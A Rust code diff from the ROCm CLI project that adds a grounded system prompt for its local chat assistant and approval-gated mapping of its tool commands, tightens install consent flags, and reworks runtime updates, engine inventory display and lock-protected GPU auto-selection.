+/// [`chat_host_facts::HostFacts`], which knows which machine it is describing.
+const ROCM_CHAT_TOOL_SYSTEM_PROMPT: &str = "You are ROCm CLI's local assistant. Speak in simple English for non-technical users. Use the provided ROCm tools when you need to inspect this machine, preview setup, read service logs, check updates, inspect automations, install or start ROCm-managed apps, or request ROCm/TheRock, config, engine, app, and local model server changes. For simple greetings or thanks like hello, hi, hey, ok, or thank you, reply normally; do not inspect ROCm, do not call tools, and do not launch or propose a model server. Tool-use rules: inspect first with read-only tools; call rocm_command only with argv-style args and no shell text; use natural_language_plan for ROCm requests that do not fit another read-only tool; ask for a mutating tool call only after explaining why it is needed; summarize tool results after they are returned. Read-only tools may run immediately. Tools that install, launch, stop, delete, or change state require user approval; request rocm_command and explain why. For 'is X running?', 'what is running?', status, or port questions, inspect before answering and do not start, stop, install, or serve anything. For ComfyUI or port 8188 use [\"comfyui\",\"status\"] or port_status. For vLLM, Lemonade, qwen, or local model servers use [\"services\",\"list\",\"--all\"] for running state and [\"engines\",\"list\"] for installed/available engine state. Treat ready/running as running, starting/recovering as starting, failed/stopped as not running, and no matching record as unknown or not managed by ROCm CLI. Interpret Examine carefully: active_runtime_status=ready means ROCm CLI has an active managed TheRock/ROCm runtime; legacy_rocm_status=not_detected only means no global system ROCm install was found. If active_runtime_status=ready, tell the user ROCm/TheRock is installed and active for ROCm CLI. For 'is TheRock installed', 'is ROCm installed', or 'which GPU is on this machine', use examine or gpu_snapshot before answering. For 'how do I setup TheRock' or install/setup requests, guide the user to choose an install folder first; do not answer with only a status check. For 'which LLMs can this machine support', use rocm_command args [\"model\"] or natural_language_plan before answering. For TheRock installs, always let the user choose the install folder. If the user names a folder or prefix, preserve that exact folder with [\"--prefix\",\"PATH\"]; you may call path_exists first to check whether that user-provided folder or its parent exists. If the user asks you to install TheRock/ROCm but has not named a folder, ask for the folder or let the guided setup folder picker collect it; do not invent a hidden default folder and do not request an install command without --prefix. Use rocm_command args [\"install\",\"sdk\",\"--channel\",\"release\",\"--format\",\"wheel\",\"--prefix\",\"PATH\"] only when the user asks you to install it and a folder is known; for a requested build date add [\"--build-date\",\"YYYY-MM-DD\"] and for a requested exact version add [\"--version\",\"VERSION\"]. For config changes, inspect with [\"config\",\"show\"] first when useful, then request config subcommands such as [\"config\",\"set-default-engine\",\"lemonade\"], [\"config\",\"set-default-runtime\",\"RUNTIME_KEY\"], or [\"config\",\"set-telemetry\",\"local\"] only after explaining why. For ComfyUI, use rocm_command with args like [\"comfyui\",\"status\"], [\"comfyui\",\"logs\"], [\"comfyui\",\"install\"], [\"comfyui\",\"start\"], or [\"comfyui\",\"stop\"]. First-time setup is the same thing as bootstrap in ROCm CLI; it is a deterministic ROCm setup flow, not a separate model chat. The built-in local assistant is fixed to qwen, which maps to Qwen3-4B-Instruct-2507-GGUF served by Lemonade with gpu_required. vLLM and Lemonade are the general serving engines; inspect or manage them when the user asks about general model serving, but do not switch the built-in assistant away from Lemonade. Use qwen-smoke only for a quick server smoke test. For vLLM management, inspect engines first and use [\"engines\",\"install\",\"vllm\"] or [\"serve\",\"MODEL\",\"--engine\",\"vllm\",\"--device\",\"gpu_required\",\"--managed\"] only where the host supports it. Do not invent shell commands and do not request CPU fallback.";
 const ROCM_CHAT_TOOL_SKILL: &str = include_str!("../../../skills/rocm-cli-assistant/SKILL.md");
 
 fn rocm_chat_tool_system_prompt() -> String {
     format!("{ROCM_CHAT_TOOL_SYSTEM_PROMPT}\n\nROCm CLI assistant skill:\n{ROCM_CHAT_TOOL_SKILL}")
+}
+
+/// The assistant prompt grounded in the machine it will answer for.
+///
+/// The single composition point: both chat surfaces (`rocm chat --prompt
+/// --tools` in this bin, and the dashboard chat via
+/// [`crate::dash::resolved_args`]) send this, so neither can drift into
+/// answering platform questions from pretraining alone.
+pub(crate) fn rocm_chat_tool_system_prompt_for_host(paths: Option<&AppPaths>) -> String {
+    let facts = chat_host_facts::HostFacts::detect(paths);
+    format!("{}\n\n{}", rocm_chat_tool_system_prompt(), facts.render())
 }
 
 fn local_provider_missing_service_error(error: &anyhow::Error) -> bool {
@@ -9722,6 +13767,42 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             Ok(ChatRocmCommandAction::ReadOnly(args))
         }
         Some("install") if second.as_deref() == Some("sdk") => {
+            // The chat/MCP surfaces spawn `rocm` with null stdin, so
+            // `interactive_terminal()` is false and the consent prompt would
+            // refuse with a "re-run with `--approve-replacing-active-default`"
+            // error, which the schema-constrained `install_sdk` tool gives the
+            // user no way to answer.
+            //
+            // Not `--yes`: that flag also approves system-package installs, and
+            // this spawn has no terminal on which to answer the `sudo` password
+            // prompt such an install can raise. Granting it here would make the
+            // vLLM/OpenMPI step run a sudo it cannot complete and abort the
+            // engine auto-install that previously warned and continued. The
+            // narrow flag grants exactly the consent the prompt is asking for.
+            //
+            // `--yes` is stripped rather than merely not added, because the
+            // generic `rocm_command` tool takes a model-supplied argv: a
+            // model-emitted `--yes` would otherwise reach this null-stdin spawn
+            // and re-grant the system-package consent `76c6aa3c` removed. The
+            // strip runs before the argv is rendered for human approval, so what
+            // is shown is still what runs.
+            //
+            // The `--yes=...` form is stripped too. Clap rejects an attached
+            // value on this flag today, so an exact-match strip happens to be
+            // airtight — but only by borrowing a property of clap's error
+            // taxonomy that nothing here owns. Giving `--yes` `num_args`, or a
+            // clap release that starts accepting `--yes=true` on a bare `bool`,
+            // would silently restore the sudo consent this strip exists to
+            // remove. Matching the prefix keeps the guarantee local to this
+            // function.
+            args.retain(|arg| arg != "--yes" && !arg.starts_with("--yes="));
+            // Withheld on `--dry-run`, which returns before the consent gate and
+            // so needs no consent: `rocmd` and dash-tui omit it there for the
+            // same reason, and a preview should not be recorded as carrying an
+            // approval it never used.
+            if !args.iter().any(|arg| arg == "--dry-run") {
+                ensure_flag(&mut args, "--approve-replacing-active-default");
+            }
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Install ROCm".to_owned(),
@@ -9737,15 +13818,36 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             })
         }
         Some("update") if args.iter().any(|arg| arg == "--apply") => {
+            ensure_flag(&mut args, "--yes");
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Apply ROCm update".to_owned(),
                 command_title: "Update".to_owned(),
             })
         }
+        Some("runtimes")
+            if second
+                .as_deref()
+                .is_some_and(|value| value == "uninstall" || value == "remove")
+                && args.iter().any(|arg| arg == "--dry-run") =>
+        {
+            Ok(ChatRocmCommandAction::ReadOnly(args))
+        }
+        Some("runtimes")
+            if second
+                .as_deref()
+                .is_some_and(|value| value == "uninstall" || value == "remove") =>
+        {
+            ensure_flag(&mut args, "--yes");
+            Ok(ChatRocmCommandAction::Approval {
+                args,
+                pending_title: "Remove ROCm install".to_owned(),
+                command_title: "Runtimes".to_owned(),
+            })
+        }
         Some("runtimes") => Ok(ChatRocmCommandAction::Approval {
             args,
-            pending_title: "Change ROCm install".to_owned(),
+            pending_title: "Change ROCm runtime".to_owned(),
             command_title: "Runtimes".to_owned(),
         }),
         Some("engines") if second.as_deref() == Some("install") => {
@@ -9814,6 +13916,7 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             })
         }
         Some("comfyui") if second.as_deref() == Some("install") => {
+            ensure_flag(&mut args, "--yes");
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Install ComfyUI".to_owned(),
@@ -9821,6 +13924,7 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             })
         }
         Some("comfyui") if second.as_deref() == Some("start") => {
+            ensure_flag(&mut args, "--yes");
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Start ComfyUI".to_owned(),
@@ -9828,6 +13932,7 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             })
         }
         Some("comfyui") if second.as_deref() == Some("stop") => {
+            ensure_flag(&mut args, "--yes");
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Stop ComfyUI".to_owned(),
@@ -9838,6 +13943,7 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
             Ok(ChatRocmCommandAction::ReadOnly(args))
         }
         Some("setup") if second.as_deref() == Some("reset") => {
+            ensure_flag(&mut args, "--yes");
             Ok(ChatRocmCommandAction::Approval {
                 args,
                 pending_title: "Reset first-time setup".to_owned(),
@@ -11009,7 +15115,7 @@ fn run_rocm_read_only_in_process(paths: &AppPaths, args: &[String]) -> Result<St
                 || command == "--version"
                 || command == "-V" =>
         {
-            Ok(format!("rocm {}\n", env!("CARGO_PKG_VERSION")))
+            Ok(format!("rocm-cli {}\n", cli_version_string()))
         }
         [command]
             if command.eq_ignore_ascii_case("model") || command.eq_ignore_ascii_case("models") =>
@@ -11170,7 +15276,23 @@ fn render_install_sdk_dry_run_for_args(paths: &AppPaths, args: &[String]) -> Res
     let version = chat_cli_arg_value(args, "--version").map(str::to_owned);
     let build_date = chat_cli_arg_value(args, "--build-date").map(str::to_owned);
     let selector = therock_install_version_selector(version, build_date)?;
-    therock::install_sdk(paths, channel, format, prefix, selector, None, true)
+    // Dry run, so nothing is displaced and the consent gate is never reached;
+    // the narrow consent is what this chat surface would pass for a real
+    // install, and passing `--yes`'s source here would be a lie waiting to be
+    // printed if the preview ever grew a gate.
+    Ok(therock::install_sdk(
+        paths,
+        channel,
+        format,
+        prefix,
+        selector,
+        None,
+        true,
+        therock::SdkInstallConsent::Preapproved(
+            therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault,
+        ),
+    )?
+    .output)
 }
 
 fn run_command_with_timeout(
@@ -11538,6 +15660,12 @@ fn rocm_chat_tool_requested_args(call: &providers::ChatToolCall) -> Option<Vec<S
                 json_string(object, "channel").unwrap_or_else(|| "release".to_owned()),
                 "--format".to_owned(),
                 json_string(object, "format").unwrap_or_else(|| "wheel".to_owned()),
+                // The MCP surface runs `rocm` with null stdin, so the consent
+                // prompt would refuse. This keeps the tool non-interactive,
+                // matching the chat `install sdk` arm. Deliberately not `--yes`:
+                // that would additionally approve a `sudo` system-package
+                // install this spawn has no terminal to answer.
+                "--approve-replacing-active-default".to_owned(),
             ];
             if let Some(prefix) = json_string(object, "prefix") {
                 args.push("--prefix".to_owned());
@@ -11706,11 +15834,43 @@ pub(crate) fn render_engine_inventory_text() -> String {
     render_engine_inventory_text_with_paths(paths.as_ref())
 }
 
+/// Marker shown beside the engine `serve`/CLI commands default to. Every
+/// place that renders this glyph MUST use this constant so the rendered
+/// character and the legend text stay in sync.
+const DEFAULT_ENGINE_MARKER: &str = "*";
+
+/// Writes the legend line explaining [`DEFAULT_ENGINE_MARKER`]. Shared by both
+/// engine-inventory renderers so the two copies cannot drift apart.
+fn write_default_engine_legend(output: &mut String) {
+    let _ = writeln!(output, "  legend: {DEFAULT_ENGINE_MARKER} = default engine");
+}
+
 fn render_engine_inventory_text_with_paths(paths: Option<&AppPaths>) -> String {
     // Mark the engine this GPU actually serves on as primary. Using the platform
     // constant put the `*` on Lemonade even on Instinct, where `serve` picks vLLM.
     let host_gpu = rocm_core::detect_host_gpu_summary(paths);
-    let default_engine = rocm_core::default_engine_for_host(&host_gpu);
+    let host_default_engine = rocm_core::default_engine_for_host(&host_gpu);
+    // A configured `default_engine` still wins over the host preference, mirroring
+    // `select_serve_engine` (and `append_examine_engine_inventory`). Without this,
+    // the legend could mark an engine `serve` will not actually default to.
+    let configured_default_engine = paths.and_then(|paths| {
+        RocmCliConfig::load(paths)
+            .ok()
+            .and_then(|config| config.default_engine)
+    });
+    // Mirrors `select_serve_engine`'s guard: a blank configured value must not
+    // out-rank the host preference, or the marker would land on an engine name
+    // that is empty rather than falling back.
+    let default_engine = configured_default_engine
+        .as_deref()
+        .filter(|value| !value.trim().is_empty())
+        .unwrap_or(host_default_engine);
+    // A configured default naming an external plugin (or a stale/typo'd name)
+    // won't appear in `engine_inventory()`'s built-ins list below — printing
+    // the legend in that case would explain a marker that lands on zero rows.
+    let any_marked = engine_inventory()
+        .iter()
+        .any(|(name, _)| *name == default_engine);
     let mut output = String::new();
     let _ = writeln!(output, "Local model engines");
     let _ = writeln!(
@@ -11727,8 +15887,15 @@ fn render_engine_inventory_text_with_paths(paths: Option<&AppPaths>) -> String {
     } else {
         let _ = writeln!(output, "  Plugin folders: not checked");
     }
+    if any_marked {
+        write_default_engine_legend(&mut output);
+    }
     for (name, note) in engine_inventory() {
-        let marker = if *name == default_engine { "*" } else { " " };
+        let marker = if *name == default_engine {
+            DEFAULT_ENGINE_MARKER
+        } else {
+            " "
+        };
         let _ = writeln!(output, "{marker} {name:10} {note}");
         append_engine_detect_summary(&mut output, name, paths);
     }
@@ -11844,11 +16011,23 @@ fn append_examine_engine_inventory(
     config: &RocmCliConfig,
     host_default_engine: &str,
 ) {
-    let configured_default = config.default_engine.as_deref();
+    // Mirrors `select_serve_engine`'s guard: a blank configured value must not
+    // out-rank the host preference, or `effective_default` below would become
+    // an engine name that is empty rather than falling back.
+    let configured_default = config
+        .default_engine
+        .as_deref()
+        .filter(|value| !value.trim().is_empty());
     // A configured value still wins, mirroring `select_serve_engine`. Only the
     // fallback becomes GPU-aware: it used to be the platform constant, which
     // reported Lemonade on Instinct where serve picks vLLM.
     let effective_default = configured_default.unwrap_or(host_default_engine);
+    // A configured default naming an external plugin (or a stale/typo'd name)
+    // won't appear in `engine_inventory()`'s built-ins list below — printing
+    // the legend in that case would explain a marker that lands on zero rows.
+    let any_marked = engine_inventory()
+        .iter()
+        .any(|(name, _)| *name == effective_default);
     let _ = writeln!(output, "engine_inventory:");
     // Unchanged on purpose: this line means "what the user configured", so an
     // unset value must keep reading as unset rather than borrowing the host default.
@@ -11889,9 +16068,12 @@ fn append_examine_engine_inventory(
             .collect::<Vec<_>>()
             .join(", ")
     );
+    if any_marked {
+        write_default_engine_legend(output);
+    }
     for (engine, note) in engine_inventory() {
         let marker = if *engine == effective_default {
-            "*"
+            DEFAULT_ENGINE_MARKER
         } else {
             " "
         };
@@ -13860,6 +18042,16 @@ fn append_update_surfaces(output: &mut String) {
     );
 }
 
+/// Whether `rocm update` should route into the runtime update path
+/// (`apply_runtime_update`) instead of the read-only status report.
+///
+/// `--dry-run` alone must take this path too, since `apply_runtime_update`
+/// only mutates anything when `dry_run` is false — a plain status report
+/// would silently ignore `--dry-run` and never show what `--apply` would do.
+const fn update_should_preview_or_apply(apply: bool, dry_run: bool) -> bool {
+    apply || dry_run
+}
+
 fn apply_runtime_update(
     paths: &AppPaths,
     config: &mut RocmCliConfig,
@@ -13869,7 +18061,7 @@ fn apply_runtime_update(
 ) -> Result<String> {
     let manifests = therock::load_runtime_manifests(paths)?;
     let source = select_runtime_update_source(&manifests, config, runtime_selector)?;
-    let plan = therock::runtime_update_plan(paths, source)?;
+    let plan = therock::runtime_update_plan(paths, source, &manifests, None)?;
     let mut output = String::new();
     let _ = writeln!(output, "runtime update");
     let _ = writeln!(output, "  source_runtime_key: {}", source.runtime_key);
@@ -13888,6 +18080,7 @@ fn apply_runtime_update(
         therock::runtime_version_display(&plan.latest_version)
     );
     let _ = writeln!(output, "  status: {}", plan.status);
+    let _ = writeln!(output, "  target_runtime_key: {}", plan.target_runtime_key);
     let _ = writeln!(output, "  activate_after_install: {activate}");
     if !plan.update_available {
         let _ = writeln!(output, "  result: no newer runtime found");
@@ -13896,34 +18089,50 @@ fn apply_runtime_update(
 
     if dry_run {
         let _ = writeln!(output, "  mode: dry-run");
-        let install_plan = therock::install_sdk(
+        let install_plan = therock::install_sdk_for_update(
             paths,
             &source.channel,
             &source.format,
-            None,
-            None,
-            None,
+            &source.family,
+            plan.device_target.as_deref(),
+            plan.source_layout_generation.as_deref(),
             true,
+            activate,
         )?;
         let _ = writeln!(output, "  install_plan:");
-        for line in install_plan.lines() {
+        for line in install_plan.output.lines() {
             let _ = writeln!(output, "    {line}");
         }
         return Ok(output);
     }
 
-    let install_output = therock::install_sdk(
+    // `activate` rather than a bare `true`: the update path is preapproved either
+    // way (its approval comes from the runtime the user selected, not from a
+    // flag, and `rocm update` has no terminal contract), but the approval line it
+    // prints must not promise an activation that only `--activate` performs
+    // below.
+    let install_output = therock::install_sdk_for_update(
         paths,
         &source.channel,
         &source.format,
-        None,
-        None,
-        None,
+        &source.family,
+        plan.device_target.as_deref(),
+        plan.source_layout_generation.as_deref(),
         false,
+        activate,
     )?;
     let manifests_after = therock::load_runtime_manifests(paths)?;
-    let installed = select_installed_update_runtime(&manifests_after, source, &plan.latest_version)
-        .context("updated runtime install completed but the new runtime manifest was not found")?;
+    // By exact key, never by version: a same-version repair installs a sibling
+    // that shares the source's channel, format, family AND version, so a
+    // version match would just as happily return the stale runtime this update
+    // was meant to replace, and then activate it.
+    let installed = select_installed_update_runtime(&manifests_after, &plan.target_runtime_key)
+        .with_context(|| {
+            format!(
+                "runtime install completed but no manifest was written for the planned runtime key `{}`",
+                plan.target_runtime_key
+            )
+        })?;
     let _ = writeln!(output, "  installed_runtime_key: {}", installed.runtime_key);
     let _ = writeln!(
         output,
@@ -13933,23 +18142,7 @@ fn apply_runtime_update(
     if activate {
         let activation = activate_runtime(paths, config, &installed.runtime_key)?;
         config.save(paths)?;
-        let _ = writeln!(
-            output,
-            "  activated_runtime_key: {}",
-            activation.runtime_key
-        );
-        let _ = writeln!(
-            output,
-            "  previous_runtime_key: {}",
-            activation
-                .previous_runtime_key
-                .as_deref()
-                .unwrap_or("<unset>")
-        );
-        let _ = writeln!(
-            output,
-            "  note: running services keep their recorded runtime until they are restarted"
-        );
+        append_update_activate_summary(&mut output, &activation);
     } else {
         let _ = writeln!(
             output,
@@ -13958,10 +18151,47 @@ fn apply_runtime_update(
         );
     }
     let _ = writeln!(output, "  install_output:");
-    for line in install_output.lines() {
+    for line in install_output.output.lines() {
         let _ = writeln!(output, "    {line}");
     }
     Ok(output)
+}
+
+/// Shown after any activation (direct `runtimes activate`, `update --apply
+/// --activate`, or an `install sdk` that switches the active runtime) that
+/// recorded a previous runtime, so every path that reaches this state gives
+/// the same advice — see `RuntimesCommand::Activate` in `runtimes()`,
+/// `append_update_activate_summary`, and `render_sdk_install_success` for the
+/// call sites.
+const ROLLBACK_RECOVERY_HINT: &str = "  next step: if this causes problems, run `rocm runtimes rollback` \
+(no history — undoes only this one activation)";
+
+/// Appends the `--activate` branch of the `update --apply` summary. The
+/// rollback hint is only shown when a previous runtime was actually recorded —
+/// `rocm runtimes rollback` hard-errors otherwise (no prior runtime to return
+/// to), so hinting it unconditionally would point users at a command that
+/// immediately fails on their very first activation.
+fn append_update_activate_summary(output: &mut String, activation: &RuntimeActivationResult) {
+    let _ = writeln!(
+        output,
+        "  activated_runtime_key: {}",
+        activation.runtime_key
+    );
+    let _ = writeln!(
+        output,
+        "  previous_runtime_key: {}",
+        activation
+            .previous_runtime_key
+            .as_deref()
+            .unwrap_or("<unset>")
+    );
+    let _ = writeln!(
+        output,
+        "  note: running services keep their recorded runtime until they are restarted"
+    );
+    if activation.previous_runtime_key.is_some() {
+        let _ = writeln!(output, "{ROLLBACK_RECOVERY_HINT}");
+    }
 }
 
 fn select_runtime_update_source<'a>(
@@ -13988,15 +18218,11 @@ fn select_runtime_update_source<'a>(
 
 fn select_installed_update_runtime<'a>(
     manifests: &'a [therock::InstalledRuntimeManifest],
-    source: &therock::InstalledRuntimeManifest,
-    latest_version: &str,
+    target_runtime_key: &str,
 ) -> Option<&'a therock::InstalledRuntimeManifest> {
-    manifests.iter().find(|manifest| {
-        manifest.channel == source.channel
-            && manifest.format == source.format
-            && manifest.family == source.family
-            && manifest.version == latest_version
-    })
+    manifests
+        .iter()
+        .find(|manifest| manifest.runtime_key == target_runtime_key)
 }
 
 pub(crate) fn render_automations_text(paths: &AppPaths, config: &RocmCliConfig) -> Result<String> {
@@ -14405,7 +18631,8 @@ pub(crate) fn managed_service_is_live(record: &ManagedServiceRecord) -> bool {
 }
 
 /// Idempotency guard for managed launches: returns an already-live managed
-/// service for this engine+model, if any.
+/// service for this engine+model, if any. The caller compares its effective
+/// launch recipe before deciding whether reuse is safe.
 ///
 /// Keyed on `(engine, canonical_model_id)` — NOT `service_id`. `generate_service_id`
 /// embeds `unix_time_millis()`, so every launch mints a unique id; matching on it
@@ -15307,6 +19534,8 @@ fn resolve_freeform_plan_with_provider(
                 content: prompt,
             }],
             max_tokens: Some(512),
+            temperature: None,
+            top_p: None,
             rocm_tools: false,
         },
     )?;
@@ -16422,12 +20651,25 @@ fn parse_gpu_indices_arg(value: Option<&str>) -> Result<Vec<u32>> {
     }
 }
 
-/// Resolve a `GpuSelection` to the concrete device ordinal to pin for this
-/// server. `Auto` picks the lowest-numbered GPU that is idle (high free VRAM)
-/// and not already serving a rocm-cli managed/foreground model; an explicit
-/// index is validated against the detected GPU count when it is known. The
-/// result holds at most one ordinal; serving across multiple GPUs is not
-/// supported.
+/// Take the managed-launch lock and decide, under it, which device ordinal this
+/// server pins. This is the whole select-then-claim critical section's entry
+/// half: the returned [`rocm_core::FileLock`] must be held by the caller until
+/// the claiming service record is persisted, at which point the choice is
+/// visible to any concurrent auto-selection and the lock is dropped (in
+/// `start_managed_service`/`run_attached_service`, before the readiness wait).
+/// Acquiring the lock and reading busy-GPU state are one operation here on
+/// purpose: split apart, two concurrent `rocm serve --gpu auto` both read the
+/// same GPU as free and land on it.
+///
+/// `pinned` is the already-validated explicit `--gpu <index>` (see
+/// [`validate_pinned_gpu_index`], which `serve()` applies before runtime
+/// resolution so a bad ordinal is refused without a runtime). Explicit-index and
+/// CPU-only launches take the lock too — their selection is fixed, but their
+/// claim-record write must stay serialized against a concurrent auto-select.
+/// Only `--gpu auto` (`cpu_only` false, `pinned` `None`) reads live state under
+/// it, picking the lowest-numbered GPU that is idle (high free VRAM) and not
+/// already serving a rocm-cli managed/foreground model. The result holds at most
+/// one ordinal; serving across multiple GPUs is not supported.
 ///
 /// Ordinal semantics: the index produced here is fed to engines via
 /// `HIP_VISIBLE_DEVICES`, but it is sourced from `amd-smi`'s `gpu` index
@@ -16436,23 +20678,100 @@ fn parse_gpu_indices_arg(value: Option<&str>) -> Result<Vec<u32>> {
 /// when `ROCR_VISIBLE_DEVICES`, CPX/partition modes, or non-default device
 /// enumeration are in play. Validate on multi-GPU hardware before relying on a
 /// specific `--gpu <index>` mapping in those configurations.
-fn resolve_gpu_indices(
+///
+/// Selection is mask-aware: `visible` is the set of HIP ordinals still usable
+/// after the active visibility mask (see [`rocm_core::usable_amd_gpu_indices`]) —
+/// already in the space the choice is exported through, since a
+/// `ROCR_VISIBLE_DEVICES` mask has its survivors re-indexed to `0..N`.
+/// Auto-selection is restricted to it, so serve never targets a masked-out
+/// device. `None` (an unprobeable host) keeps the previous mask-unaware
+/// behavior.
+///
+/// The lock is held for as long as the caller keeps the guard, which includes
+/// the already-running check inside `spawn_managed_engine_child` — that refreshes
+/// managed-service liveness and can issue per-service endpoint probes, so an
+/// unrelated concurrent serve can wait on the order of seconds. `FileLock`
+/// blocks without a timeout; the slow first-use install is deliberately kept
+/// outside this section so it is not also serialized.
+fn select_gpu_indices_under_launch_lock(
     paths: &AppPaths,
-    selection: &GpuSelection,
+    cpu_only: bool,
+    pinned: Option<Vec<u32>>,
+    detect_count: impl FnOnce() -> Option<usize>,
+    visible: Option<&[u32]>,
     vram: Option<&[GpuVramUsage]>,
-) -> Result<Vec<u32>> {
-    let detected = detect_gpu_count();
-    match selection {
-        GpuSelection::Index(index) => validate_pinned_gpu_index(*index, detected),
-        GpuSelection::Auto => Ok(auto_select_gpu_indices(paths, detected, vram)),
-    }
+) -> Result<(Vec<u32>, rocm_core::FileLock)> {
+    let lock = rocm_core::FileLock::acquire(paths.managed_launch_lock_path())?;
+    let indices = if cpu_only {
+        Vec::new()
+    } else if let Some(indices) = pinned {
+        indices
+    } else {
+        // `detect_count` is invoked only here: it shells out to amd-smi, and the
+        // CPU-only and explicit-index paths have no use for the count, so they do
+        // not pay for that subprocess inside the critical section.
+        auto_select_gpu_indices(paths, detect_count(), visible, vram)
+    };
+    Ok((indices, lock))
 }
 
-/// Validate an explicit `--gpu <index>` against the detected GPU count and
-/// return the single pinned ordinal. Errors when the index is out of range for
-/// a known device count; an unknown count (amd-smi unavailable) is allowed
-/// through so serving can still proceed where GPU probing is not possible.
-fn validate_pinned_gpu_index(index: u32, detected: Option<usize>) -> Result<Vec<u32>> {
+/// Validate an explicit `--gpu <index>` against the active visibility set,
+/// returning the single pinned ordinal. `visible` is the set of HIP ordinals
+/// still usable after the visibility mask (see
+/// [`rocm_core::usable_amd_gpu_indices`]) — already in the same space the index
+/// is exported through — so it is the authoritative answer whenever it could be
+/// enumerated. `detected` is only a fallback range check for hosts where the
+/// visible set is unknown (`visible` is `None`). Both `None` (an unprobeable
+/// host) is allowed through so serving can still proceed.
+fn validate_pinned_gpu_index(
+    index: u32,
+    detected: Option<usize>,
+    visible: Option<&[u32]>,
+    mask_active: bool,
+) -> Result<Vec<u32>> {
+    // Prefer the visibility-resolved set. It is authoritative and already in the
+    // HIP-ordinal space `--gpu` is exported through, so it settles both range and
+    // mask membership in one comparison — avoiding the earlier bug of checking
+    // the index against `detected` (a differently-probed physical count) and
+    // `visible` (HIP space) as if they shared one ordinal space.
+    //
+    // `mask_active` only shapes the message, not the accept/reject decision: with
+    // no mask set the visible set is just `0..present`, so an index outside it is
+    // simply absent from the host, and blaming HIP/ROCR variables the user never
+    // set sends them chasing an environment problem that does not exist.
+    if let Some(visible) = visible {
+        if visible.is_empty() {
+            // An empty set is authoritative "no GPU usable" (every device masked
+            // out, or none present), not "could not enumerate" — that is `None`.
+            // serve()'s no-usable-GPU fail-fast normally reports this first with a
+            // fuller message; reject here too so a bad `--gpu` can never slip
+            // through.
+            if mask_active {
+                bail!(
+                    "no usable AMD GPU is available under the active visibility mask \
+                     (HIP_VISIBLE_DEVICES/ROCR_VISIBLE_DEVICES); `--gpu {index}` cannot be honoured"
+                );
+            }
+            bail!("no usable AMD GPU is present on this host; `--gpu {index}` cannot be honoured");
+        }
+        if !visible.contains(&index) {
+            let list = visible
+                .iter()
+                .map(u32::to_string)
+                .collect::<Vec<_>>()
+                .join(", ");
+            if mask_active {
+                bail!(
+                    "--gpu index {index} is not available under the active visibility mask \
+                     (HIP_VISIBLE_DEVICES/ROCR_VISIBLE_DEVICES); usable GPU indices: [{list}]"
+                );
+            }
+            bail!("--gpu index {index} is not present on this host; usable GPU indices: [{list}]");
+        }
+        return Ok(vec![index]);
+    }
+    // No visible set could be enumerated: fall back to the raw detected count so
+    // an obviously out-of-range index is still refused.
     if let Some(count) = detected
         && (index as usize) >= count
     {
@@ -16502,36 +20821,64 @@ const AUTO_FREE_VRAM_FRACTION: f64 = 0.90;
 /// assuming device 0 — the engine's device probe then pins the first present GPU
 /// or fails fast under the GPU-required policy.
 ///
-/// Selection reads service state without holding a lock, so two near-concurrent
-/// `--gpu auto` launches can race onto the same idle GPU. The VRAM-occupancy
-/// fallback and the start-time low-memory warning keep this from silently
-/// overcommitting in practice; pass an explicit `--gpu <index>` to avoid the
-/// race entirely.
+/// Selection is mask-aware: candidates are restricted to `visible`, the HIP
+/// ordinals still usable after the active visibility mask (see
+/// [`rocm_core::usable_amd_gpu_indices`]), so auto-select never lands on a
+/// masked-out GPU the engine would then reject. `None` (an unprobeable host)
+/// leaves the detected range unrestricted, as before.
+///
+/// Under a `ROCR_VISIBLE_DEVICES` mask the *choice* is correct — `visible` is
+/// already re-indexed into the HIP space the selection is exported through — but
+/// the `vram` rows come from amd-smi, which does not honour that mask, so the
+/// idleness ranking can read a different device's occupancy than the one the
+/// ordinal binds. That is a best-effort heuristic, not a binding hazard: it can
+/// pick a less idle visible GPU, never a hidden one. Translating amd-smi rows
+/// through a ROCR mask is deferred (needs multi-GPU hardware to verify).
+///
+/// This reads service state (`busy_gpu_indices`) but does not lock on its own.
+/// Concurrency safety is the caller's responsibility: `serve()` holds the
+/// managed-launch lock (`AppPaths::managed_launch_lock_path`) across this
+/// selection and the claiming record write, so two near-concurrent `--gpu auto`
+/// launches are serialized and cannot land on the same idle GPU. Callers that
+/// select outside that lock get only best-effort de-confliction from the
+/// VRAM-occupancy fallback and the start-time low-memory warning.
 fn auto_select_gpu_indices(
     paths: &AppPaths,
     detected: Option<usize>,
+    visible: Option<&[u32]>,
     vram: Option<&[GpuVramUsage]>,
 ) -> Vec<u32> {
     let busy = busy_gpu_indices(paths);
-    select_auto_gpu_index(detected, &busy, vram)
+    select_auto_gpu_index(detected, visible, &busy, vram)
 }
 
 /// Pure auto-selection used by [`auto_select_gpu_indices`], split out so the
 /// preference order can be unit-tested without amd-smi or service state.
 fn select_auto_gpu_index(
     detected: Option<usize>,
+    visible: Option<&[u32]>,
     busy: &[u32],
     vram: Option<&[GpuVramUsage]>,
 ) -> Vec<u32> {
+    // Candidate ordinals: the detected device range, narrowed to those still
+    // visible under the active mask so auto-select never targets a masked-out GPU.
+    // `visible` is in HIP space (a ROCR mask's survivors are re-indexed to `0..N`),
+    // which is the space the selection is exported through, so the retained
+    // ordinals are directly selectable. When the host is unprobeable (`visible` is
+    // `None`) the range is used unrestricted (mask-unaware, as before).
     let count = detected.unwrap_or(0);
-    if count == 0 {
-        // No GPU count from amd-smi (unavailable, or genuinely zero devices). Do
-        // not assume device 0 exists: return no selection and let the engine's
-        // device probe pin the first present GPU or fail fast under the
-        // GPU-required policy (no GPU-0 fallback).
+    let mut all: Vec<u32> = (0..count as u32).collect();
+    if let Some(visible) = visible {
+        all.retain(|index| visible.contains(index));
+    }
+    if all.is_empty() {
